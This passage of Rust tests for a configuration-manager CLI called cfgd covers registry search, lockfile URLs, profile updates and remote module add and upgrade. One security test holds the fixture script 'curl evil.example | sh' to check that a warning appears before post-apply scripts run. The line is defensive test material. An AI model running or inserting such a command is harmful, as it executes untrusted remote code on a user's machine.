        cmd_module_keys_rotate(&printer, Some(dir.to_str().unwrap()), &[])
            .expect("rotate happy path → Ok");

        // The new key files written by the shim are present.
        assert_eq!(
            std::fs::read(dir.join("cosign.key")).unwrap(),
            b"fake-private-key-bytes",
            "new private key matches shim output"
        );
        assert_eq!(
            std::fs::read(dir.join("cosign.pub")).unwrap(),
            b"fake-public-key-bytes",
            "new public key matches shim output"
        );

        // The old keys were backed up under a timestamped suffix.
        let entries: Vec<_> = std::fs::read_dir(dir)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().to_string())
            .collect();
        let backup_priv = entries
            .iter()
            .find(|n| n.starts_with("cosign.key.") && n.len() > "cosign.key.".len())
            .expect("backup of private key must exist");
        let backup_pub = entries
            .iter()
            .find(|n| n.starts_with("cosign.pub.") && n.len() > "cosign.pub.".len())
            .expect("backup of public key must exist");
        assert_eq!(
            std::fs::read(dir.join(backup_priv)).unwrap(),
            b"old-private-key-bytes",
            "private-key backup preserves the original bytes"
        );
        assert_eq!(
            std::fs::read(dir.join(backup_pub)).unwrap(),
            b"old-public-key-bytes",
            "public-key backup preserves the original bytes"
        );
    }
}

// -----------------------------------------------------------------------
// filter_and_build_search_results — pure search/filter
// -----------------------------------------------------------------------

fn make_registry_module(
    registry: &str,
    name: &str,
    description: &str,
    tags: Vec<&str>,
) -> modules::RegistryModule {
    modules::RegistryModule {
        name: name.to_string(),
        description: description.to_string(),
        registry: registry.to_string(),
        tags: tags.iter().map(|t| t.to_string()).collect(),
    }
}

#[test]
fn filter_and_build_search_results_matches_substring_case_insensitively() {
    // Substring + case-insensitive matters because users type `nvim`
    // expecting to find `neovim-shared` or `MyNVIM`. The current contract
    // is case-insensitive contains() on name only — descriptions don't
    // match, registries don't match.
    let modules = vec![
        make_registry_module(
            "cfgd-community",
            "Neovim-config",
            "lua editor",
            vec!["v0.1.0", "v0.2.0"],
        ),
        make_registry_module("cfgd-community", "vim-bundle", "old editor", vec!["v1.0.0"]),
        make_registry_module(
            "cfgd-community",
            "tmux-bar",
            "terminal multiplexer",
            vec!["v3.0"],
        ),
    ];
    let results = super::registry::filter_and_build_search_results(&modules, "vim");
    let names: Vec<&str> = results.iter().map(|r| r.name.as_str()).collect();
    assert_eq!(
        names,
        vec!["cfgd-community/Neovim-config", "cfgd-community/vim-bundle"]
    );
}

#[test]
fn filter_and_build_search_results_uses_last_tag_as_version() {
    // tags is iteration-ordered (oldest-first based on how the registry
    // scanner reads them); the LAST entry is treated as the "latest".
    // If this changes (e.g. someone sorts tags differently), version
    // pinning in the UI silently shifts.
    let modules = vec![make_registry_module(
        "comm",
        "thing",
        "x",
        vec!["v0.1.0", "v0.2.0", "v1.0.0"],
    )];
    let results = super::registry::filter_and_build_search_results(&modules, "thing");
    assert_eq!(results[0].version.as_deref(), Some("v1.0.0"));
}

#[test]
fn filter_and_build_search_results_emits_none_version_for_module_with_no_tags() {
    // A registry-module with no tags (e.g. brand-new, unreleased) should
    // appear in search but with version=None so the UI renders "-" not
    // "v"-prefix-of-garbage.
    let modules = vec![make_registry_module("comm", "fresh", "no tags yet", vec![])];
    let results = super::registry::filter_and_build_search_results(&modules, "fresh");
    assert_eq!(results.len(), 1);
    assert!(results[0].version.is_none());
}

#[test]
fn filter_and_build_search_results_omits_empty_description() {
    // Empty description must become None (Option) not Some("") — the
    // JSON serializer drops None via skip_serializing_if, so an empty
    // string would leak into JSON output as `"description": ""`.
    let modules = vec![
        make_registry_module("comm", "with-desc", "describes itself", vec!["v1"]),
        make_registry_module("comm", "no-desc", "", vec!["v1"]),
    ];
    let results = super::registry::filter_and_build_search_results(&modules, "desc");
    let with_desc = results.iter().find(|r| r.name == "comm/with-desc").unwrap();
    let no_desc = results.iter().find(|r| r.name == "comm/no-desc").unwrap();
    assert_eq!(with_desc.description.as_deref(), Some("describes itself"));
    assert!(no_desc.description.is_none());
}

#[test]
fn filter_and_build_search_results_empty_query_matches_everything() {
    // Empty string is a substring of every string — empty query
    // returns all modules. Users use this to browse a registry.
    let modules = vec![
        make_registry_module("comm", "alpha", "", vec!["v1"]),
        make_registry_module("comm", "beta", "", vec!["v1"]),
        make_registry_module("comm", "gamma", "", vec!["v1"]),
    ];
    let results = super::registry::filter_and_build_search_results(&modules, "");
    assert_eq!(results.len(), 3);
}

#[test]
fn filter_and_build_search_results_preserves_registry_name_in_output() {
    // The output `name` is `<registry>/<module>` — the registry prefix
    // matters because users with multiple registries need to disambiguate
    // identically-named modules. Pinning this so a future "drop the
    // prefix because it looks redundant" change can't slip through.
    let modules = vec![
        make_registry_module("org-a", "shared", "", vec!["v1"]),
        make_registry_module("org-b", "shared", "", vec!["v1"]),
    ];
    let results = super::registry::filter_and_build_search_results(&modules, "shared");
    let names: Vec<&str> = results.iter().map(|r| r.name.as_str()).collect();
    assert_eq!(names, vec!["org-a/shared", "org-b/shared"]);
    assert_eq!(results[0].registry, "org-a");
    assert_eq!(results[1].registry, "org-b");
}

// -----------------------------------------------------------------------
// print_module_review_summary — pre-confirm display
// -----------------------------------------------------------------------

fn make_loaded_module(name: &str, spec: config::ModuleSpec) -> modules::LoadedModule {
    modules::LoadedModule {
        name: name.to_string(),
        spec,
        dir: std::path::PathBuf::from("/tmp/test-module"),
        origin: None,
    }
}

#[test]
fn print_module_review_summary_emits_subheader_and_commit_integrity() {
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    let module = make_loaded_module("vim-config", config::ModuleSpec::default());
    super::registry::print_module_review_summary(
        &printer,
        "vim-config",
        &module,
        "abc123",
        "sha256:def456",
    );
    drop(printer);
    let out = buf.lock().unwrap().clone();
    assert!(out.contains("Module: vim-config"), "subheader: {out}");
    assert!(out.contains("Commit"), "commit kv missing: {out}");
    assert!(out.contains("abc123"), "commit value missing: {out}");
    assert!(out.contains("Integrity"), "integrity kv missing: {out}");
    assert!(
        out.contains("sha256:def456"),
        "integrity value missing: {out}"
    );
}

#[test]
fn print_module_review_summary_shows_dependency_list_when_present() {
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    let module = make_loaded_module(
        "m",
        config::ModuleSpec {
            depends: vec!["base".into(), "shell".into()],
            ..Default::default()
        },
    );
    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
    drop(printer);
    let out = buf.lock().unwrap().clone();
    assert!(out.contains("Dependencies"), "Dependencies kv: {out}");
    assert!(out.contains("base, shell"), "deps joined: {out}");
}

#[test]
fn print_module_review_summary_lists_packages_with_min_version_when_set() {
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    let module = make_loaded_module(
        "m",
        config::ModuleSpec {
            packages: vec![
                config::ModulePackageEntry {
                    name: "ripgrep".into(),
                    min_version: Some("13.0".into()),
                    ..Default::default()
                },
                config::ModulePackageEntry {
                    name: "fd".into(),
                    ..Default::default()
                },
            ],
            ..Default::default()
        },
    );
    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
    drop(printer);
    let out = buf.lock().unwrap().clone();
    assert!(out.contains("Packages (2)"), "count: {out}");
    assert!(out.contains("ripgrep (min: 13.0)"), "min-version: {out}");
    assert!(out.contains("fd"), "second pkg: {out}");
}

#[test]
fn print_module_review_summary_warns_on_post_apply_scripts() {
    // Critical security UX — adding a remote module that runs
    // post-apply scripts gets a visible WARNING before the confirm
    // prompt. If this regresses, users could miss that a remote module
    // is about to execute shell on their machine.
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    let module = make_loaded_module(
        "m",
        config::ModuleSpec {
            scripts: Some(config::ScriptSpec {
                pre_apply: vec![],
                post_apply: vec![cfgd_core::config::ScriptEntry::Simple(
                    "curl evil.example | sh".to_string(),
                )],
                ..Default::default()
            }),
            ..Default::default()
        },
    );
    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
    drop(printer);
    let out = buf.lock().unwrap().clone();
    assert!(
        out.contains("Post-apply scripts (1)"),
        "script count line: {out}"
    );
    assert!(
        out.contains("will execute on your machine"),
        "explicit warning text: {out}"
    );
    assert!(
        out.contains("curl evil.example | sh"),
        "script body verbatim: {out}"
    );
}

#[test]
fn print_module_review_summary_omits_empty_sections() {
    // A module with only `depends` should not emit Packages/Files/
    // Scripts subheaders — the output should stay tight, not push
    // "Packages (0):" noise into the confirm-prompt view.
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    let module = make_loaded_module(
        "m",
        config::ModuleSpec {
            depends: vec!["base".into()],
            ..Default::default()
        },
    );
    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
    drop(printer);
    let out = buf.lock().unwrap().clone();
    assert!(!out.contains("Packages ("), "no packages section: {out}");
    assert!(!out.contains("Files ("), "no files section: {out}");
    assert!(!out.contains("Post-apply"), "no scripts section: {out}");
}

// ============================================================================
// compute_lock_url — URL stored in lockfile entries
//
// The lockfile URL is what `cmd_module_upgrade` re-parses to recover the
// source coordinates. The contract pinned here:
// - no subdir → preserve user's raw URL verbatim (round-trip exact)
// - has subdir → strip `//subdir`, re-attach `@tag` or `?ref=branch`
// ============================================================================

#[test]
fn compute_lock_url_without_subdir_preserves_raw_url_exactly() {
    let git_src = modules::GitSource {
        repo_url: "https://example.com/u/r.git".into(),
        tag: Some("v1.2.3".into()),
        git_ref: None,
        subdir: None,
    };
    let url = super::registry::compute_lock_url("https://example.com/u/r.git@v1.2.3", &git_src);
    assert_eq!(url, "https://example.com/u/r.git@v1.2.3");
}

#[test]
fn compute_lock_url_with_subdir_strips_subdir_and_reattaches_tag() {
    let git_src = modules::GitSource {
        repo_url: "https://example.com/u/r.git".into(),
        tag: Some("v1.0.0".into()),
        git_ref: None,
        subdir: Some("modules/foo".into()),
    };
    let url = super::registry::compute_lock_url(
        "https://example.com/u/r.git//modules/foo@v1.0.0",
        &git_src,
    );
    assert_eq!(url, "https://example.com/u/r.git@v1.0.0");
}

#[test]
fn compute_lock_url_with_subdir_and_branch_ref_emits_query_form() {
    let git_src = modules::GitSource {
        repo_url: "https://example.com/u/r.git".into(),
        tag: None,
        git_ref: Some("dev".into()),
        subdir: Some("modules/foo".into()),
    };
    let url = super::registry::compute_lock_url(
        "https://example.com/u/r.git//modules/foo?ref=dev",
        &git_src,
    );
    assert_eq!(url, "https://example.com/u/r.git?ref=dev");
}

#[test]
fn compute_lock_url_with_subdir_and_no_tag_or_ref_returns_bare_repo() {
    let git_src = modules::GitSource {
        repo_url: "https://example.com/u/r.git".into(),
        tag: None,
        git_ref: None,
        subdir: Some("modules/foo".into()),
    };
    let url =
        super::registry::compute_lock_url("https://example.com/u/r.git//modules/foo", &git_src);
    assert_eq!(url, "https://example.com/u/r.git");
}

#[test]
fn compute_lock_url_no_subdir_no_tag_preserves_bare_url() {
    let git_src = modules::GitSource {
        repo_url: "https://example.com/u/r.git".into(),
        tag: None,
        git_ref: None,
        subdir: None,
    };
    let url = super::registry::compute_lock_url("https://example.com/u/r.git", &git_src);
    assert_eq!(url, "https://example.com/u/r.git");
}

// ============================================================================
// compute_pinned_ref — precedence: tag > git_ref > commit
// ============================================================================

#[test]
fn compute_pinned_ref_prefers_tag_over_ref_and_commit() {
    let git_src = modules::GitSource {
        repo_url: "x".into(),
        tag: Some("v2.0".into()),
        git_ref: Some("dev".into()),
        subdir: None,
    };
    let pin = super::registry::compute_pinned_ref(&git_src, "deadbeef");
    assert_eq!(pin, "v2.0");
}

#[test]
fn compute_pinned_ref_uses_branch_ref_when_no_tag() {
    let git_src = modules::GitSource {
        repo_url: "x".into(),
        tag: None,
        git_ref: Some("dev".into()),
        subdir: None,
    };
    let pin = super::registry::compute_pinned_ref(&git_src, "deadbeef");
    assert_eq!(pin, "dev");
}

#[test]
fn compute_pinned_ref_falls_back_to_commit_sha_when_no_tag_or_ref() {
    let git_src = modules::GitSource {
        repo_url: "x".into(),
        tag: None,
        git_ref: None,
        subdir: None,
    };
    let pin = super::registry::compute_pinned_ref(&git_src, "abc123def456");
    assert_eq!(pin, "abc123def456");
}

// ============================================================================
// ensure_module_in_profile_doc — idempotent profile-modules append
// ============================================================================

fn make_profile_doc(modules: Vec<&str>) -> config::ProfileDocument {
    config::ProfileDocument {
        api_version: "cfgd.io/v1alpha1".to_string(),
        kind: "Profile".to_string(),
        metadata: config::ProfileMetadata {
            name: "test".to_string(),
        },
        spec: config::ProfileSpec {
            modules: modules.into_iter().map(|s| s.to_string()).collect(),
            ..Default::default()
        },
    }
}

#[test]
fn ensure_module_in_profile_doc_appends_when_absent_returns_true() {
    let mut doc = make_profile_doc(vec!["base"]);
    let changed = super::registry::ensure_module_in_profile_doc(&mut doc, "vim-config");
    assert!(changed);
    assert_eq!(doc.spec.modules, vec!["base", "vim-config"]);
}

#[test]
fn ensure_module_in_profile_doc_is_idempotent_returns_false() {
    let mut doc = make_profile_doc(vec!["base", "vim-config"]);
    let changed = super::registry::ensure_module_in_profile_doc(&mut doc, "vim-config");
    assert!(!changed, "second add should be no-op");
    assert_eq!(doc.spec.modules, vec!["base", "vim-config"]);
}

#[test]
fn ensure_module_in_profile_doc_preserves_ordering_on_append() {
    // Order matters: profile module list is rendered to YAML in this order,
    // and downstream reconciliation respects declaration order for ties.
    let mut doc = make_profile_doc(vec!["a", "b", "c"]);
    super::registry::ensure_module_in_profile_doc(&mut doc, "z");
    assert_eq!(doc.spec.modules, vec!["a", "b", "c", "z"]);
}

#[test]
fn ensure_module_in_profile_doc_treats_registry_prefixed_refs_as_distinct() {
    // `registry/module` is a different reference than bare `module`. Both
    // should be addable independently — the helper compares full strings,
    // not parsed components.
    let mut doc = make_profile_doc(vec!["vim-config"]);
    let changed = super::registry::ensure_module_in_profile_doc(&mut doc, "official/vim-config");
    assert!(changed);
    assert_eq!(doc.spec.modules, vec!["vim-config", "official/vim-config"]);
}

// ─── cmd_module_add_remote / cmd_module_upgrade against local bare repo ──────
//
// These tests drive the full remote-module orchestration end-to-end against a
// `file://` URL. `CFGD_ALLOW_LOCAL_SOURCES=1` flips the `is_git_source` gate
// so the file:// URL is accepted, and `with_test_home_guard` redirects
// `default_module_cache_dir` off of the real `~/.cache/cfgd/`.

#[cfg(unix)]
mod cmd_module_add_remote_local_bare {
    use super::*;
    use serial_test::serial;
    use std::path::{Path, PathBuf};

    /// Initialise a bare upstream + a working source repo, commit `module.yaml`
    /// at the root, annotate the commit with `tag`, and push both the branch
    /// and the tag to the bare. Returns the bare path so `file://<bare>` can
    /// be used as a clone source.
    fn make_bare_with_module(tmp_root: &Path, module_name: &str, tag: &str) -> PathBuf {
        let bare = tmp_root.join("upstream.git");
        let _bare_repo = git2::Repository::init_bare(&bare).unwrap();

        let src = tmp_root.join("src");
        let src_repo = git2::Repository::init(&src).unwrap();
        let yaml = format!(
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: {}\n  description: test mod\nspec: {{}}\n",
            module_name
        );
        std::fs::write(src.join("module.yaml"), yaml).unwrap();
        let mut index = src_repo.index().unwrap();
        index.add_path(Path::new("module.yaml")).unwrap();
        index.write().unwrap();
        let tree_id = index.write_tree().unwrap();
        let tree = src_repo.find_tree(tree_id).unwrap();
        let sig = git2::Signature::now("t", "t@example.com").unwrap();
        let commit_id = src_repo
            .commit(Some("HEAD"), &sig, &sig, "initial", &tree, &[])
            .unwrap();
        drop(tree);
        let commit_obj = src_repo.find_commit(commit_id).unwrap();
        // Annotated tag (carries metadata but no signature — fine with
        // `allow_unsigned=true`).
        src_repo
            .tag(tag, commit_obj.as_object(), &sig, "release", false)
            .unwrap();

        let bare_url = cfgd_core::test_helpers::file_url(&bare);
        let mut remote = src_repo.remote("origin", &bare_url).unwrap();
        let branch = src_repo
            .head()
            .unwrap()
            .shorthand()
            .unwrap_or("master")
            .to_string();
        remote
            .push(
                &[
                    &format!("refs/heads/{branch}:refs/heads/{branch}"),
                    &format!("refs/tags/{tag}:refs/tags/{tag}"),
                ],
                None,
            )
            .unwrap();
        bare
    }

    /// Add a second commit + tag to an existing source repo and push it.
    fn add_tag_to_bare(src: &Path, bare: &Path, new_tag: &str) {
        let src_repo = git2::Repository::open(src).unwrap();
        // Mutate module.yaml so the new commit differs from the first.
        let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mymod\n  description: bumped\nspec: {}\n";
        std::fs::write(src.join("module.yaml"), yaml).unwrap();
        let mut index = src_repo.index().unwrap();
        index.add_path(Path::new("module.yaml")).unwrap();
        index.write().unwrap();
        let tree_id = index.write_tree().unwrap();
        let tree = src_repo.find_tree(tree_id).unwrap();
        let sig = git2::Signature::now("t", "t@example.com").unwrap();
        let parent = src_repo.head().unwrap().peel_to_commit().unwrap();
        let commit_id = src_repo
            .commit(Some("HEAD"), &sig, &sig, "bump", &tree, &[&parent])
            .unwrap();
        drop(tree);
        let commit_obj = src_repo.find_commit(commit_id).unwrap();
        src_repo
            .tag(new_tag, commit_obj.as_object(), &sig, "release", false)
            .unwrap();
        let bare_url = cfgd_core::test_helpers::file_url(bare);
        let mut remote = src_repo.remote_anonymous(&bare_url).unwrap();
        let branch = src_repo
            .head()
            .unwrap()
            .shorthand()
            .unwrap_or("master")
            .to_string();
        remote
            .push(
                &[
                    &format!("+refs/heads/{branch}:refs/heads/{branch}"),
                    &format!("refs/tags/{new_tag}:refs/tags/{new_tag}"),
                ],
                None,
            )
            .unwrap();
    }

    /// Like `make_bare_with_module`, but tags the commit with the registry
    /// `<module>/<version>` convention (e.g. `mymod/v1.0.0`) instead of a plain
    /// version tag. This is what `cmd_module_upgrade`'s no-ref ("latest")
    /// resolution looks for. Returns the bare path.
    fn make_bare_with_prefixed_tag(tmp_root: &Path, module_name: &str, version: &str) -> PathBuf {
        let bare = tmp_root.join("upstream.git");
        let _bare_repo = git2::Repository::init_bare(&bare).unwrap();

        let src = tmp_root.join("src");
        let src_repo = git2::Repository::init(&src).unwrap();
        let yaml = format!(
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: {module_name}\n  description: v{version}\nspec: {{}}\n"
        );
        std::fs::write(src.join("module.yaml"), yaml).unwrap();
        let mut index = src_repo.index().unwrap();
        index.add_path(Path::new("module.yaml")).unwrap();
        index.write().unwrap();
        let tree_id = index.write_tree().unwrap();
        let tree = src_repo.find_tree(tree_id).unwrap();
        let sig = git2::Signature::now("t", "t@example.com").unwrap();
        let commit_id = src_repo
            .commit(Some("HEAD"), &sig, &sig, "initial", &tree, &[])
            .unwrap();
        drop(tree);
        let commit_obj = src_repo.find_commit(commit_id).unwrap();
        let tag = format!("{module_name}/v{version}");
        src_repo
            .tag(&tag, commit_obj.as_object(), &sig, "release", false)
            .unwrap();

        let bare_url = cfgd_core::test_helpers::file_url(&bare);
        let mut remote = src_repo.remote("origin", &bare_url).unwrap();
        let branch = src_repo
            .head()
            .unwrap()
            .shorthand()
            .unwrap_or("master")
            .to_string();
        remote
            .push(
                &[
                    &format!("refs/heads/{branch}:refs/heads/{branch}"),
                    &format!("refs/tags/{tag}:refs/tags/{tag}"),
                ],
                None,
            )
            .unwrap();
        bare
    }

    /// Add a second commit + `<module>/<version>` tag to an existing source repo
    /// and push it. Companion to `make_bare_with_prefixed_tag`.
    fn add_prefixed_tag_to_bare(src: &Path, bare: &Path, module_name: &str, version: &str) {
        let src_repo = git2::Repository::open(src).unwrap();
        let yaml = format!(
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: {module_name}\n  description: v{version}\nspec: {{}}\n"
        );
        std::fs::write(src.join("module.yaml"), yaml).unwrap();
        let mut index = src_repo.index().unwrap();
        index.add_path(Path::new("module.yaml")).unwrap();
        index.write().unwrap();
        let tree_id = index.write_tree().unwrap();
        let tree = src_repo.find_tree(tree_id).unwrap();
        let sig = git2::Signature::now("t", "t@example.com").unwrap();
        let parent = src_repo.head().unwrap().peel_to_commit().unwrap();
        let commit_id = src_repo
            .commit(Some("HEAD"), &sig, &sig, "bump", &tree, &[&parent])
            .unwrap();
        drop(tree);
        let commit_obj = src_repo.find_commit(commit_id).unwrap();
        let tag = format!("{module_name}/v{version}");
        src_repo
            .tag(&tag, commit_obj.as_object(), &sig, "release", false)
            .unwrap();
        let bare_url = cfgd_core::test_helpers::file_url(bare);
        let mut remote = src_repo.remote_anonymous(&bare_url).unwrap();
        let branch = src_repo
            .head()
            .unwrap()
            .shorthand()
            .unwrap_or("master")
            .to_string();
        remote
            .push(
                &[
                    &format!("+refs/heads/{branch}:refs/heads/{branch}"),
                    &format!("refs/tags/{tag}:refs/tags/{tag}"),
                ],
                None,
            )
            .unwrap();
    }

    /// RAII env-var helper: set on construction, remove on drop. Tests using
    /// this MUST be marked `#[serial]` — env mutation is process-wide.
    struct EnvGuard {
        key: &'static str,
    }
    impl EnvGuard {
        fn set(key: &'static str, value: &str) -> Self {
            // SAFETY: serialized via #[serial].
            unsafe {
                std::env::set_var(key, value);
            }
            Self { key }
        }
    }
    impl Drop for EnvGuard {
        fn drop(&mut self) {
            // SAFETY: serialized via #[serial].
            unsafe {
                std::env::remove_var(self.key);
            }
        }
    }

    #[test]
    #[serial]
    fn cmd_module_add_remote_against_local_bare_adds_to_lockfile_and_profile() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_module(bare_root.path(), "mymod", "v1.0.0");
        let url = format!("{}@v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer = make_printer();
        cmd_module_add_remote(&cli, &printer, &url, None, true, true)
            .expect("cmd_module_add_remote happy path");

        // Lockfile created with the new module entry.
        let lockfile_path = work.path().join("modules.lock");
        assert!(lockfile_path.exists(), "modules.lock should exist");
        let lockfile_contents = std::fs::read_to_string(&lockfile_path).unwrap();
        assert!(
            lockfile_contents.contains("mymod"),
            "lockfile should list mymod: {lockfile_contents}"
        );
        assert!(
            lockfile_contents.contains("v1.0.0"),
            "lockfile pinned_ref should record v1.0.0: {lockfile_contents}"
        );

        // Profile updated with the module reference.
        let profile_yaml =
            std::fs::read_to_string(work.path().join("profiles/default.yaml")).unwrap();
        assert!(
            profile_yaml.contains("mymod"),
            "profile should reference mymod after add: {profile_yaml}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_add_remote_is_idempotent_when_module_already_in_lockfile() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_module(bare_root.path(), "mymod", "v1.0.0");
        let url = format!("{}@v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer1 = make_printer();
        cmd_module_add_remote(&cli, &printer1, &url, None, true, true).unwrap();
        // Second invocation hits the "already in lockfile" early return.
        let (printer2, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_add_remote(&cli, &printer2, &url, None, true, true)
            .expect("second add should noop, not error");
        drop(printer2);

        let output = buf.lock().unwrap();
        assert!(
            output.contains("already in the lockfile"),
            "second add should report idempotent skip: {output}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_add_remote_bails_when_local_module_with_same_name_exists() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        // Seed a local module under <config>/modules/<name>/ so the
        // local-vs-remote name collision check fires.
        let local_mod_yaml =
            "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mymod\nspec: {}\n";
        make_module(work.path(), "mymod", local_mod_yaml);

        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_module(bare_root.path(), "mymod", "v1.0.0");
        let url = format!("{}@v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer = make_printer();
        let err = cmd_module_add_remote(&cli, &printer, &url, None, true, true)
            .expect_err("local-module collision should refuse to proceed");
        let msg = err.to_string();
        assert!(
            msg.contains("Local module") && msg.contains("mymod"),
            "error should mention the local-module collision: {msg}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_upgrade_against_local_bare_replaces_lockfile_entry() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_module(bare_root.path(), "mymod", "v1.0.0");
        let url_v1 = format!("{}@v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer = make_printer();
        cmd_module_add_remote(&cli, &printer, &url_v1, None, true, true).unwrap();

        // Capture v1 lockfile state for comparison.
        let lock_v1 = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();
        assert!(lock_v1.contains("v1.0.0"));

        // Push v2 to the bare repo.
        let src = bare_root.path().join("src");
        add_tag_to_bare(&src, &bare, "v2.0.0");

        // Upgrade to v2.0.0.
        cmd_module_upgrade(&cli, &printer, "mymod", Some("v2.0.0"), true, true)
            .expect("upgrade to v2.0.0 should succeed");

        let lock_v2 = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();
        assert!(
            lock_v2.contains("v2.0.0"),
            "lockfile should now pin v2.0.0: {lock_v2}"
        );
        assert!(
            !lock_v2.contains("v1.0.0") || lock_v2.matches("v2.0.0").count() >= 1,
            "lockfile should advance past v1.0.0: {lock_v2}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_upgrade_returns_early_when_module_not_in_lockfile() {
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let cli = test_cli(work.path());
        let printer = make_printer();
        let err = cmd_module_upgrade(&cli, &printer, "ghost", Some("v9.9.9"), true, true)
            .expect_err("upgrading a non-tracked module should error");
        let msg = err.to_string();
        assert!(
            msg.contains("not found") || msg.contains("ghost"),
            "error should explain that the module isn't tracked: {msg}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_upgrade_no_ref_resolves_highest_published_tag() {
        // Regression for the no-ref "latest" arm. Module versions are git tags
        // named `<module>/<version>`. Install pins `mymod/v1.0.0`; a newer
        // `mymod/v2.0.0` tag is published. `cfgd module upgrade mymod` (no
        // --ref) must resolve "latest" to the highest published tag
        // (mymod/v2.0.0) and advance the lockfile — NOT resolve default-branch
        // HEAD and short-circuit at "already at this version".
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_prefixed_tag(bare_root.path(), "mymod", "1.0.0");
        let url_v1 = format!("{}@mymod/v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer1 = make_printer();
        cmd_module_add_remote(&cli, &printer1, &url_v1, None, true, true).unwrap();

        // Capture the v1 commit the lockfile pinned, then publish v2.
        let lockfile_v1 = modules::load_lockfile(&config_dir(&cli)).unwrap();
        let entry_v1 = lockfile_v1
            .modules
            .iter()
            .find(|e| e.name == "mymod")
            .expect("mymod locked at v1");
        let commit_v1 = entry_v1.commit.clone();
        assert_eq!(entry_v1.pinned_ref, "mymod/v1.0.0");

        let src = bare_root.path().join("src");
        add_prefixed_tag_to_bare(&src, &bare, "mymod", "2.0.0");

        // No --ref: must resolve and advance to mymod/v2.0.0.
        let (printer2, buf2) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_upgrade(&cli, &printer2, "mymod", None, true, true)
            .expect("no-ref upgrade should resolve and apply the latest tag");
        drop(printer2);

        let out = buf2.lock().unwrap();
        assert!(
            out.contains("Latest version: mymod/v2.0.0"),
            "no-ref arm should resolve the highest published tag: {out}"
        );

        let lockfile_v2 = modules::load_lockfile(&config_dir(&cli)).unwrap();
        let entry_v2 = lockfile_v2
            .modules
            .iter()
            .find(|e| e.name == "mymod")
            .expect("mymod still locked");
        assert_eq!(
            entry_v2.pinned_ref, "mymod/v2.0.0",
            "lockfile pinned_ref should advance to the full v2 tag"
        );
        assert_ne!(
            entry_v2.commit, commit_v1,
            "lockfile commit should move off the v1 commit"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_upgrade_no_ref_errors_when_no_published_versions() {
        // The registry model is tag-based: with no `<module>/v*` tags the
        // no-ref upgrade must surface a clear error rather than silently
        // falling back to a branch HEAD.
        let work = setup_config_dir();
        let _home = cfgd_core::with_test_home_guard(work.path());
        let _env = EnvGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");

        // `make_bare_with_module` tags the commit `v1.0.0` (no `mymod/` prefix),
        // so there is no `mymod/v*` version tag for "latest" to resolve.
        let bare_root = tempfile::tempdir().unwrap();
        let bare = make_bare_with_module(bare_root.path(), "mymod", "v1.0.0");
        let url_v1 = format!("{}@v1.0.0", cfgd_core::to_file_url(&bare));

        let cli = test_cli(work.path());
        let printer1 = make_printer();
        cmd_module_add_remote(&cli, &printer1, &url_v1, None, true, true).unwrap();

        let lock_before = std::fs::read_to_string(work.path().join("modules.lock")).unwrap();

        let printer2 = make_printer();
        let err = cmd_module_upgrade(&cli, &printer2, "mymod", None, true, true)
            .expect_err("no published versions should error, not no-op");
        let msg = err.to_string();
        assert!(
            msg.contains("No published versions") && msg.contains("mymod"),
            "error should explain there are no published versions: {msg}"
        );

